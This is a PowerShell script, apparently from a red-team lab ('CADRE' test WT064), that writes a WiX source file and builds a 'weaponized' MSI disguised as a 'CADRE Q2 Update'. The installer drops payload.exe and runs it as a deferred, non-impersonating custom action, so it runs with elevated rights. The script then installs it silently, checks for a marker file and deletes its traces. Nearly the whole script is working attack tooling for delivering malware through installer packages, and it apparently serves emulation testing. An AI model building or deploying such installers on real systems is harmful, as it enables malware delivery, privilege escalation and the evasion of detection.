# CADRE — WT064 — MSI Installer Execution (REAL, 2026-08-03)
# Builds a weaponized .msi with WiX that runs payload.exe as a deferred custom action,
# executes it, and verifies the H-PAYLOAD marker. Payload built on ws01 (build host),
# hosted + served by provisioning (192.168.77.60:8081) per the H provisioning->ws01 topology.
$ErrorActionPreference = 'Continue'
$www = 'C:\Tools\campaign-h\www'
$wix = "$www\wix"

if (-not (Test-Path "$wix\candle.exe")) { Write-Output 'WIX_MISSING'; exit 1 }
if (-not (Test-Path "$www\payload.exe")) { Write-Output 'PAYLOAD_MISSING'; exit 1 }

Write-Output '=== 1. Write evil.wxs ==='
$wxs = @'
<?xml version="1.0" encoding="UTF-8"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="CADRE Q2 Update" Language="1033" Version="1.0.0" Manufacturer="CADRE Lab" UpgradeCode="11111111-2222-3333-4444-555555555555">
    <Package InstallerVersion="200" Compressed="yes" InstallScope="perUser"/>
    <MajorUpgrade DowngradeErrorMessage="A newer version of [ProductName] is already installed."/>
    <Media Id="1" Cabinet="media1.cab" EmbedCab="yes"/>
    <Directory Id="TARGETDIR" Name="SourceDir">
      <Directory Id="ProgramFilesFolder">
        <Directory Id="INSTALLFOLDER" Name="CADREH02"/>
      </Directory>
    </Directory>
    <Component Id="PayloadComponent" Guid="*" Directory="INSTALLFOLDER">
      <File Id="PayloadFile" Source="payload.exe" KeyPath="yes"/>
    </Component>
    <Feature Id="MainFeature" Title="Main" Level="1">
      <ComponentRef Id="PayloadComponent"/>
    </Feature>
    <CustomAction Id="RunPayload" FileKey="PayloadFile" ExeCommand="" Execute="deferred" Impersonate="no" Return="ignore"/>
    <InstallExecuteSequence>
      <Custom Action="RunPayload" After="InstallFiles"/>
    </InstallExecuteSequence>
  </Product>
</Wix>
'@
Set-Content -Path "$www\H-02-evil.wxs" -Value $wxs -Encoding UTF8
Write-Output 'WXS_WRITTEN'

Write-Output '=== 2. candle + light ==='
Push-Location $www
& "$wix\candle.exe" H-02-evil.wxs -o H-02-evil.wixobj 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Output "CANDLE|$_" }
& "$wix\light.exe" H-02-evil.wixobj -out H-02-evil.msi 2>&1 | Select-Object -Last 3 | ForEach-Object { Write-Output "LIGHT|$_" }
Pop-Location
Write-Output "MSI_EXISTS $(Test-Path "$www\H-02-evil.msi")"
if (Test-Path "$www\H-02-evil.msi") { Write-Output "MSI_SIZE $((Get-Item "$www\H-02-evil.msi").Length)" }

Write-Output '=== 3. Execute MSI ==='
Remove-Item 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt' -ErrorAction SilentlyContinue
Start-Process msiexec -ArgumentList "/i `"$www\H-02-evil.msi`"", '/qn' -Wait -ErrorAction SilentlyContinue
Start-Sleep -Seconds 5
Write-Output "MARKER_HIT $(Test-Path 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt')"
if (Test-Path 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt') { Get-Content 'C:\Windows\Temp\H-PAYLOAD-MARKER.txt' }

Write-Output '=== 4. Cleanup MSI artifacts ==='
Remove-Item "$www\H-02-evil.msi", "$www\H-02-evil.wixobj", "$www\H-02-evil.wxs" -ErrorAction SilentlyContinue
Write-Output 'WT064_DONE'
